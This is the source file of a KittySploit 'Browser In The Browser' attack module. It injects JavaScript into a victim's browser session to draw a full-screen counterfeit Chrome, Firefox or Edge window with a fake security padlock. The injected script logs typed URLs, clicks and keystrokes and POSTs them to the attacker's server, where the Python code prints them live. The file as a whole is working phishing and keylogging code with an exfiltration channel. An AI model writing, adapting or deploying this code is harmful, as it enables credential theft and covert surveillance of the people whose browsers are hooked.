from kittysploit import *
import uuid
import time
import json

class Module(BrowserAuxiliary):

    __info__ = {
        "name": "Browser In The Browser",
        "description": "Create a fake browser interface inside the real browser to capture user interactions (URLs, clicks, keystrokes)",
        "author": "KittySploit Team",
        "browser": Browser.ALL,
        "platform": Platform.ALL,
        "session_type": SessionType.BROWSER,
    }

    browser_type = OptString("chrome", "Browser type to simulate (chrome, firefox, edge)", True)
    target_url = OptString("https://kittysploit.com", "Initial URL to display in the fake browser", True)
    capture_keystrokes = OptString("true", "Capture all keystrokes (true/false)", True)
    capture_urls = OptString("true", "Capture all URLs entered (true/false)", True)
    capture_clicks = OptString("true", "Capture all clicks (true/false)", True)
    timeout = OptInteger(0, "Timeout in seconds (0 = run indefinitely until Ctrl+C)", True)

    def check(self):
        """Check if the module can be executed"""
        return True

    def run(self):
        """Create a fake browser interface and capture user interactions"""
        bitb_id = str(uuid.uuid4())
        
        # Convert string booleans to actual booleans for JavaScript
        capture_keystrokes = self.capture_keystrokes.lower() in ('true', '1', 'yes', 'on')
        capture_urls = self.capture_urls.lower() in ('true', '1', 'yes', 'on')
        capture_clicks = self.capture_clicks.lower() in ('true', '1', 'yes', 'on')
        
        # Get server configuration
        code_js = f"""
        (function() {{
            const BITB_ID = '{bitb_id}';
            const BROWSER_TYPE = '{self.browser_type}';
            const TARGET_URL = '{self.target_url}';
            const CAPTURE_KEYSTROKES = {str(capture_keystrokes).lower()};
            const CAPTURE_URLS = {str(capture_urls).lower()};
            const CAPTURE_CLICKS = {str(capture_clicks).lower()};
            
            let SERVER_HOST = '127.0.0.1';
            let SERVER_PORT = '8080';
            
            if (window.kittysploit) {{
                if (typeof window.kittysploit.getServerHost === 'function') {{
                    SERVER_HOST = window.kittysploit.getServerHost();
                }}
                if (typeof window.kittysploit.getServerPort === 'function') {{
                    SERVER_PORT = window.kittysploit.getServerPort();
                }}
            }}
            
            // Function to send captured data to server
            function sendCapturedData(data) {{
                let currentSessionId = null;
                if (window.kittysploit && typeof window.kittysploit.sessionId === 'function') {{
                    currentSessionId = window.kittysploit.sessionId();
                }}
                
                const payload = {{
                    session_id: currentSessionId,
                    command_id: BITB_ID,
                    result: JSON.stringify({{
                        type: 'browser_in_browser',
                        data: data,
                        timestamp: new Date().toISOString()
                    }}),
                    timestamp: new Date().toISOString()
                }};
                
                fetch(`http://${{SERVER_HOST}}:${{SERVER_PORT}}/api/command`, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify(payload)
                }}).catch(error => {{}});
            }}
            
            // Check if BITB already exists
            if (document.getElementById('ks-bitb-container')) {{
                return 'Browser In The Browser already active';
            }}
            
            // Store captured data
            const capturedData = {{
                urls: [],
                keystrokes: [],
                clicks: [],
                currentUrl: TARGET_URL
            }};
            
            // Create main container
            const container = document.createElement('div');
            container.id = 'ks-bitb-container';
            container.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 999999;
                background: #f5f5f5;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                display: flex;
                flex-direction: column;
            `;
            
            // Browser-specific styles with more realistic colors
            let browserStyles = {{}};
            if (BROWSER_TYPE === 'chrome') {{
                browserStyles = {{
                    barColor: '#f1f3f4',
                    barBorder: '#dadce0',
                    buttonHover: '#e8eaed',
                    buttonActive: '#d1d4d8',
                    activeTabBg: '#ffffff',
                    inactiveTabBg: '#e8eaed',
                    tabBorder: '#dadce0',
                    tabHover: '#f8f9fa',
                    addressBarBg: '#ffffff',
                    addressBarBorder: '#dadce0',
                    addressBarFocus: '#1a73e8',
                    textColor: '#202124',
                    textSecondary: '#5f6368'
                }};
            }} else if (BROWSER_TYPE === 'firefox') {{
                browserStyles = {{
                    barColor: '#f9f9fa',
                    barBorder: '#d7d7db',
                    buttonHover: '#e0e0e2',
                    buttonActive: '#c8c8c8',
                    activeTabBg: '#ffffff',
                    inactiveTabBg: '#f0f0f4',
                    tabBorder: '#d7d7db',
                    tabHover: '#f9f9fa',
                    addressBarBg: '#ffffff',
                    addressBarBorder: '#d7d7db',
                    addressBarFocus: '#0060df',
                    textColor: '#0c0c0d',
                    textSecondary: '#737373'
                }};
            }} else {{ // edge
                browserStyles = {{
                    barColor: '#f3f3f3',
                    barBorder: '#d1d1d1',
                    buttonHover: '#e5e5e5',
                    buttonActive: '#d1d1d1',
                    activeTabBg: '#ffffff',
                    inactiveTabBg: '#f3f3f3',
                    tabBorder: '#d1d1d1',
                    tabHover: '#fafafa',
                    addressBarBg: '#ffffff',
                    addressBarBorder: '#d1d1d1',
                    addressBarFocus: '#0078d4',
                    textColor: '#1a1a1a',
                    textSecondary: '#666666'
                }};
            }}
            
            // Create toolbar
            const toolbar = document.createElement('div');
            toolbar.style.cssText = `
                background: ${{browserStyles.barColor}};
                border-bottom: 1px solid ${{browserStyles.barBorder}};
                padding: 6px 8px;
                display: flex;
                align-items: center;
                gap: 6px;
                flex-shrink: 0;
                box-shadow: 0 1px 2px rgba(0,0,0,0.05);
            `;
            
            // Navigation buttons with SVG icons
            const navButtons = document.createElement('div');
            navButtons.style.cssText = 'display: flex; gap: 2px; align-items: center;';
            
            const backBtn = createNavButton(`
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M19 12H5M12 19l-7-7 7-7"/>
                </svg>
            `, 'Go back');
            const forwardBtn = createNavButton(`
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M5 12h14M12 5l7 7-7 7"/>
                </svg>
            `, 'Go forward');
            const refreshBtn = createNavButton(`
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8M21 8v5M21 8h-5"/>
                    <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16M3 16v-5M3 16h5"/>
                </svg>
            `, 'Refresh');
            const homeBtn = createNavButton(`
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>
                    <polyline points="9 22 9 12 15 12 15 22"/>
                </svg>
            `, 'Home');
            
            navButtons.appendChild(backBtn);
            navButtons.appendChild(forwardBtn);
            navButtons.appendChild(refreshBtn);
            navButtons.appendChild(homeBtn);
            
            // Address bar container with icons
            const addressBarContainer = document.createElement('div');
            addressBarContainer.style.cssText = `
                flex: 1;
                display: flex;
                align-items: center;
                background: ${{browserStyles.addressBarBg}};
                border: 1px solid ${{browserStyles.addressBarBorder}};
                border-radius: 24px;
                padding: 0 12px;
                gap: 8px;
                transition: all 0.2s;
                box-shadow: 0 1px 2px rgba(0,0,0,0.05);
            `;
            
            // Security icon (lock for HTTPS)
            const securityIcon = document.createElement('div');
            securityIcon.innerHTML = `
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                </svg>
            `;
            securityIcon.style.cssText = `
                color: ${{browserStyles.textSecondary}};
                display: flex;
                align-items: center;
                flex-shrink: 0;
            `;
            
            // Address bar input
            const addressBar = document.createElement('input');
            addressBar.type = 'text';
            addressBar.value = TARGET_URL;
            addressBar.style.cssText = `
                flex: 1;
                border: none;
                background: transparent;
                font-size: 14px;
                color: ${{browserStyles.textColor}};
                outline: none;
                padding: 8px 0;
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            `;
            addressBar.placeholder = 'Search Google or type a URL';
            
            // Focus effect
            addressBar.addEventListener('focus', function() {{
                addressBarContainer.style.borderColor = browserStyles.addressBarFocus;
                addressBarContainer.style.boxShadow = `0 0 0 2px ${{browserStyles.addressBarFocus}}33`;
            }});
            addressBar.addEventListener('blur', function() {{
                addressBarContainer.style.borderColor = browserStyles.addressBarBorder;
                addressBarContainer.style.boxShadow = '0 1px 2px rgba(0,0,0,0.05)';
            }});
            
            addressBarContainer.appendChild(securityIcon);
            addressBarContainer.appendChild(addressBar);
            
            // Capture URL input
            if (CAPTURE_URLS) {{
                addressBar.addEventListener('input', function(e) {{
                    capturedData.currentUrl = e.target.value;
                }});
                
                addressBar.addEventListener('keypress', function(e) {{
                    if (e.key === 'Enter') {{
                        const url = e.target.value;
                        capturedData.urls.push({{
                            url: url,
                            timestamp: new Date().toISOString()
                        }});
                        sendCapturedData({{
                            event: 'url_entered',
                            url: url
                        }});
                        loadUrl(url);
                    }}
                }});
            }}
            
            // Menu button with SVG
            const menuBtn = createNavButton(`
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <line x1="3" y1="6" x2="21" y2="6"/>
                    <line x1="3" y1="12" x2="21" y2="12"/>
                    <line x1="3" y1="18" x2="21" y2="18"/>
                </svg>
            `, 'Menu');
            
            toolbar.appendChild(navButtons);
            toolbar.appendChild(addressBar);
            toolbar.appendChild(menuBtn);
            
            // Create tabs bar
            const tabsBar = document.createElement('div');
            tabsBar.style.cssText = `
                background: ${{browserStyles.barColor}};
                border-bottom: 1px solid ${{browserStyles.barBorder}};
                display: flex;
                align-items: flex-end;
                padding: 0 8px;
                gap: 1px;
                flex-shrink: 0;
                overflow-x: auto;
                position: relative;
            `;
            
            // New tab button
            const newTabBtn = document.createElement('div');
            newTabBtn.innerHTML = '+';
            newTabBtn.style.cssText = `
                width: 28px;
                height: 28px;
                display: flex;
                align-items: center;
                justify-content: center;
                cursor: pointer;
                color: ${{browserStyles.textSecondary}};
                font-size: 18px;
                border-radius: 4px;
                margin: 0 4px 4px 0;
                transition: background 0.15s;
            `;
            newTabBtn.onmouseover = function() {{ this.style.background = browserStyles.buttonHover; }};
            newTabBtn.onmouseout = function() {{ this.style.background = 'transparent'; }};
            newTabBtn.onclick = function() {{
                const newTab = createTab('New Tab', false);
                tabsBar.insertBefore(newTab, newTabBtn);
            }};
            
            // Create first tab
            const tab = createTab('New Tab', true);
            tabsBar.appendChild(tab);
            tabsBar.appendChild(newTabBtn);
            
            // Create content area (iframe)
            const contentArea = document.createElement('div');
            contentArea.style.cssText = `
                flex: 1;
                position: relative;
                overflow: hidden;
                background: white;
            `;
            
            const iframe = document.createElement('iframe');
            iframe.id = 'ks-bitb-iframe';
            iframe.style.cssText = `
                width: 100%;
                height: 100%;
                border: none;
            `;
            iframe.src = TARGET_URL;
            contentArea.appendChild(iframe);
            
            // Function to create navigation button with SVG
            function createNavButton(svgContent, title) {{
                const btn = document.createElement('button');
                btn.innerHTML = svgContent;
                btn.title = title;
                btn.style.cssText = `
                    width: 36px;
                    height: 36px;
                    border: none;
                    background: transparent;
                    cursor: pointer;
                    border-radius: 6px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    color: ${{browserStyles.textSecondary}};
                    transition: all 0.15s;
                    padding: 0;
                `;
                btn.onmouseover = function() {{
                    this.style.background = browserStyles.buttonHover;
                    this.style.color = browserStyles.textColor;
                }};
                btn.onmouseout = function() {{
                    this.style.background = 'transparent';
                    this.style.color = browserStyles.textSecondary;
                }};
                btn.onmousedown = function() {{
                    this.style.background = browserStyles.buttonActive;
                }};
                btn.onmouseup = function() {{
                    this.style.background = browserStyles.buttonHover;
                }};
                return btn;
            }}
            
            // Function to create tab with close button
            function createTab(title, active) {{
                const tabDiv = document.createElement('div');
                tabDiv.style.cssText = `
                    display: flex;
                    align-items: center;
                    gap: 8px;
                    padding: 8px 12px;
                    background: ${{active ? browserStyles.activeTabBg : browserStyles.inactiveTabBg}};
                    border: 1px solid ${{browserStyles.tabBorder}};
                    border-bottom: none;
                    border-radius: 8px 8px 0 0;
                    cursor: pointer;
                    white-space: nowrap;
                    position: relative;
                    max-width: 240px;
                    min-width: 120px;
                    transition: all 0.15s;
                    margin-right: 1px;
                `;
                
                // Favicon placeholder
                const favicon = document.createElement('div');
                favicon.innerHTML = `
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
                        <circle cx="12" cy="10" r="3"/>
                    </svg>
                `;
                favicon.style.cssText = `
                    width: 16px;
                    height: 16px;
                    color: ${{browserStyles.textSecondary}};
                    flex-shrink: 0;
                `;
                
                // Tab title
                const tabTitle = document.createElement('span');
                tabTitle.textContent = title;
                tabTitle.style.cssText = `
                    flex: 1;
                    overflow: hidden;
                    text-overflow: ellipsis;
                    white-space: nowrap;
                    font-size: 13px;
                    color: ${{browserStyles.textColor}};
                `;
                
                // Close button
                const closeBtn = document.createElement('div');
                closeBtn.innerHTML = `
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <line x1="18" y1="6" x2="6" y2="18"/>
                        <line x1="6" y1="6" x2="18" y2="18"/>
                    </svg>
                `;
                closeBtn.style.cssText = `
                    width: 18px;
                    height: 18px;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    border-radius: 4px;
                    color: ${{browserStyles.textSecondary}};
                    opacity: 0;
                    transition: all 0.15s;
                    flex-shrink: 0;
                `;
                closeBtn.onmouseover = function(e) {{
                    e.stopPropagation();
                    this.style.background = '#e81123';
                    this.style.color = '#ffffff';
                }};
                closeBtn.onmouseout = function() {{
                    this.style.background = 'transparent';
                    this.style.color = browserStyles.textSecondary;
                }};
                closeBtn.onclick = function(e) {{
                    e.stopPropagation();
                    tabDiv.remove();
                }};
                
                tabDiv.appendChild(favicon);
                tabDiv.appendChild(tabTitle);
                tabDiv.appendChild(closeBtn);
                
                // Show close button on hover
                tabDiv.onmouseenter = function() {{
                    closeBtn.style.opacity = '1';
                    if (!active) {{
                        tabDiv.style.background = browserStyles.tabHover;
                    }}
                }};
                tabDiv.onmouseleave = function() {{
                    closeBtn.style.opacity = '0';
                    if (!active) {{
                        tabDiv.style.background = browserStyles.inactiveTabBg;
                    }}
                }};
                
                if (CAPTURE_CLICKS) {{
                    tabDiv.addEventListener('click', function() {{
                        capturedData.clicks.push({{
                            element: 'tab',
                            title: title,
                            timestamp: new Date().toISOString()
                        }});
                        sendCapturedData({{
                            event: 'tab_clicked',
                            tab: title
                        }});
                    }});
                }}
                
                return tabDiv;
            }}
            
            // Function to update security icon
            function updateSecurityIcon(url) {{
                const isSecure = url.startsWith('https://');
                if (isSecure) {{
                    securityIcon.innerHTML = `
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
                        </svg>
                    `;
                    securityIcon.style.color = '#1a73e8';
                }} else {{
                    securityIcon.innerHTML = `
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="12" cy="12" r="10"/>
                            <line x1="12" y1="8" x2="12" y2="12"/>
                            <line x1="12" y1="16" x2="12.01" y2="16"/>
                        </svg>
                    `;
                    securityIcon.style.color = browserStyles.textSecondary;
                }}
            }}
            
            // Function to load URL
            function loadUrl(url) {{
                try {{
                    // Try to add protocol if missing
                    if (!url.match(/^https?:\\/\\//)) {{
                        if (url.includes('.') && !url.includes(' ')) {{
                            url = 'https://' + url;
                        }} else {{
                            url = 'https://www.google.com/search?q=' + encodeURIComponent(url);
                        }}
                    }}
                    iframe.src = url;
                    addressBar.value = url;
                    updateSecurityIcon(url);
                }} catch (e) {{
                    console.error('Error loading URL:', e);
                }}
            }}
            
            // Navigation button handlers
            backBtn.onclick = function() {{
                if (CAPTURE_CLICKS) {{
                    capturedData.clicks.push({{
                        element: 'back_button',
                        timestamp: new Date().toISOString()
                    }});
                    sendCapturedData({{ event: 'back_clicked' }});
                }}
                iframe.contentWindow.history.back();
            }};
            
            forwardBtn.onclick = function() {{
                if (CAPTURE_CLICKS) {{
                    capturedData.clicks.push({{
                        element: 'forward_button',
                        timestamp: new Date().toISOString()
                    }});
                    sendCapturedData({{ event: 'forward_clicked' }});
                }}
                iframe.contentWindow.history.forward();
            }};
            
            refreshBtn.onclick = function() {{
                if (CAPTURE_CLICKS) {{
                    capturedData.clicks.push({{
                        element: 'refresh_button',
                        timestamp: new Date().toISOString()
                    }});
                    sendCapturedData({{ event: 'refresh_clicked' }});
                }}
                iframe.src = iframe.src;
            }};
            
            homeBtn.onclick = function() {{
                if (CAPTURE_CLICKS) {{
                    capturedData.clicks.push({{
                        element: 'home_button',
                        timestamp: new Date().toISOString()
                    }});
                    sendCapturedData({{ event: 'home_clicked' }});
                }}
                loadUrl('https://www.google.com');
            }};
            
            // Combined iframe onload handler
            iframe.onload = function() {{
                // Update security icon
                updateSecurityIcon(iframe.src);
                
                // Capture keystrokes in iframe
                if (CAPTURE_KEYSTROKES) {{
                    try {{
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        iframeDoc.addEventListener('keydown', function(e) {{
                            const keyData = {{
                                key: e.key,
                                code: e.code,
                                keyCode: e.keyCode,
                                shiftKey: e.shiftKey,
                                ctrlKey: e.ctrlKey,
                                altKey: e.altKey,
                                metaKey: e.metaKey,
                                url: iframe.src,
                                timestamp: new Date().toISOString()
                            }};
                            
                            capturedData.keystrokes.push(keyData);
                            
                            // Send every 10 keystrokes or every 3 seconds
                            if (capturedData.keystrokes.length >= 10) {{
                                sendCapturedData({{
                                    event: 'keystrokes',
                                    keystrokes: capturedData.keystrokes.slice()
                                }});
                                capturedData.keystrokes = [];
                            }}
                        }});
                    }} catch (e) {{
                        // Cross-origin restrictions
                    }}
                }}
                
                // Capture clicks in iframe
                if (CAPTURE_CLICKS) {{
                    try {{
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        iframeDoc.addEventListener('click', function(e) {{
                            const clickData = {{
                                x: e.clientX,
                                y: e.clientY,
                                target: e.target.tagName,
                                text: e.target.textContent ? e.target.textContent.substring(0, 50) : '',
                                url: iframe.src,
                                timestamp: new Date().toISOString()
                            }};
                            
                            capturedData.clicks.push(clickData);
                            
                            sendCapturedData({{
                                event: 'iframe_click',
                                click: clickData
                            }});
                        }});
                    }} catch (e) {{
                        // Cross-origin restrictions
                    }}
                }}
            }};
            
            // Assemble everything
            container.appendChild(toolbar);
            container.appendChild(tabsBar);
            container.appendChild(contentArea);
            
            // Add to page
            document.body.appendChild(container);
            
            // Prevent right-click context menu
            container.addEventListener('contextmenu', function(e) {{
                e.preventDefault();
                return false;
            }});
            
            // Send initial notification
            sendCapturedData({{
                event: 'browser_initialized',
                browser_type: BROWSER_TYPE,
                initial_url: TARGET_URL
            }});
            
            return 'Browser In The Browser initialized successfully';
        }})();
        """
        
        result = self.send_js(code_js)
        if not result:
            print_error("Failed to inject Browser In The Browser module")
            return False
        
        print_success("Browser In The Browser module injected successfully!")
        print_info(f"Browser type: {self.browser_type}")
        print_info(f"Initial URL: {self.target_url}")
        print_info("The fake browser interface is now active and capturing user interactions.")
        
        # Convert timeout to int if it's a string
        try:
            timeout_value = int(self.timeout) if isinstance(self.timeout, str) else self.timeout
        except (ValueError, TypeError):
            timeout_value = 0
        
        # Monitor for captured data (only if timeout > 0)
        # Note: Monitoring errors should not fail the module since injection succeeded
        if timeout_value > 0:
            print_info("Press Ctrl+C to stop monitoring...")
            print_empty()
            try:
                self._monitor_captures(bitb_id)
            except KeyboardInterrupt:
                print_status("Monitoring interrupted by user")
            except Exception as e:
                # Log error but don't fail the module - injection was successful
                print_warning(f"Monitoring error (browser interface is still active): {e}")
                import traceback
                print_debug(traceback.format_exc())
        else:
            print_info("Monitoring disabled (timeout=0). The browser interface is active.")
        
        # Always return True since injection succeeded
        return True
    
    def _monitor_captures(self, bitb_id: str):
        """Monitor and display captured data in real-time"""
        # Ensure browser server is available
        self._ensure_browser_server()
        if not self.browser_server:
            print_error("Browser server not available")
            return
        
        # Convert timeout to int if it's a string
        try:
            timeout_value = int(self.timeout) if isinstance(self.timeout, str) else self.timeout
        except (ValueError, TypeError):
            timeout_value = 0
        
        # If timeout is 0, don't monitor (just inject and return)
        if timeout_value == 0:
            print_info("Monitoring disabled (timeout=0). The browser interface is active but not monitoring.")
            return
        
        start_time = time.time()
        last_response_count = 0
        
        try:
            while True:
                # Check timeout
                elapsed = time.time() - start_time
                if elapsed >= timeout_value:
                    break
                
                try:
                    # Get session to check for new responses
                    try:
                        session = self.browser_server.get_session(self.session_id)
                    except Exception as e:
                        print_error(f"Error getting session: {e}")
                        break
                    
                    if not session:
                        print_error("Session not found")
                        break
                    
                    # Check if session has responses attribute
                    if not hasattr(session, 'responses'):
                        print_warning("Session does not have responses attribute")
                        time.sleep(0.5)
                        continue
                    
                    # Check for new responses with our BITB ID
                    try:
                        response_count = len(session.responses) if session.responses else 0
                    except (AttributeError, TypeError):
                        response_count = 0
                    
                    if response_count > last_response_count:
                        try:
                            # Safely get new responses
                            new_responses = session.responses[last_response_count:] if isinstance(session.responses, list) else []
                        except (IndexError, TypeError, AttributeError) as e:
                            print_debug(f"Error accessing responses: {e}")
                            new_responses = []
                        
                        for response in new_responses:
                            if not isinstance(response, dict):
                                continue
                            if response.get('command_id') == bitb_id:
                                try:
                                    result_data = response.get('result', '')
                                    if result_data:
                                        data = json.loads(result_data)
                                        if data.get('type') == 'browser_in_browser':
                                            event_data = data.get('data', {})
                                            event_type = event_data.get('event', '')
                                            
                                            # Display based on event type
                                            if event_type == 'browser_initialized':
                                                print_success(f"[BITB] Browser initialized: {event_data.get('browser_type', 'unknown')}")
                                                print_info(f"[BITB] Initial URL: {event_data.get('initial_url', 'unknown')}")
                                            
                                            elif event_type == 'url_entered':
                                                url = event_data.get('url', '')
                                                print_success(f"[BITB] URL entered: {url}")
                                            
                                            elif event_type == 'keystrokes':
                                                keystrokes = event_data.get('keystrokes', [])
                                                for key_data in keystrokes:
                                                    key = key_data.get('key', '')
                                                    # Format special keys
                                                    if key == 'Enter':
                                                        print_info(f"[BITB] [KEY] <Enter>")
                                                    elif key == ' ':
                                                        print_info(f"[BITB] [KEY] <Space>")
                                                    elif len(key) == 1:
                                                        modifiers = []
                                                        if key_data.get('shiftKey'):
                                                            modifiers.append('Shift')
                                                        if key_data.get('ctrlKey'):
                                                            modifiers.append('Ctrl')
                                                        if key_data.get('altKey'):
                                                            modifiers.append('Alt')
                                                        if key_data.get('metaKey'):
                                                            modifiers.append('Meta')
                                                        
                                                        modifier_str = '+'.join(modifiers) + '+' if modifiers else ''
                                                        print_info(f"[BITB] [KEY] {modifier_str}{key}")
                                                    else:
                                                        print_info(f"[BITB] [KEY] <{key}>")
                                            
                                            elif event_type == 'iframe_click':
                                                click = event_data.get('click', {})
                                                target = click.get('target', 'unknown')
                                                text = click.get('text', '')[:30]
                                                url = click.get('url', 'unknown')
                                                print_info(f"[BITB] [CLICK] {target} on {url}")
                                                if text:
                                                    print_info(f"[BITB]        Text: {text}...")
                                            
                                            elif event_type in ['back_clicked', 'forward_clicked', 'refresh_clicked', 'home_clicked']:
                                                print_info(f"[BITB] [ACTION] {event_type.replace('_', ' ').title()}")
                                            
                                            elif event_type == 'tab_clicked':
                                                tab = event_data.get('tab', 'unknown')
                                                print_info(f"[BITB] [TAB] Clicked on: {tab}")
                                            
                                except json.JSONDecodeError:
                                    # Try to display raw result if not JSON
                                    print_debug(f"[BITB] Raw response: {result_data}")
                                except Exception as e:
                                    print_debug(f"Error parsing captured data: {e}")
                        
                        # Update last_response_count safely
                        try:
                            if isinstance(session.responses, list):
                                last_response_count = len(session.responses)
                            else:
                                last_response_count = 0
                        except (AttributeError, TypeError) as e:
                            print_debug(f"Error updating response count: {e}")
                            last_response_count = 0
                
                except Exception as e:
                    # Log but continue - don't break on individual iteration errors
                    print_debug(f"Error in monitoring iteration: {e}")
                
                # Small sleep to avoid busy waiting
                try:
                    time.sleep(0.5)  # Check every 0.5 seconds
                except Exception:
                    break  # If sleep fails, exit loop
                
        except KeyboardInterrupt:
            print_status("Stopping Browser In The Browser monitoring...")
        except Exception as e:
            print_error(f"Error in monitoring loop: {e}")
            import traceback
            print_debug(traceback.format_exc())
            # Don't re-raise, just log the error and continue
            pass
        
        print_status("[*] Monitoring stopped. The fake browser interface remains active in the victim's browser.")
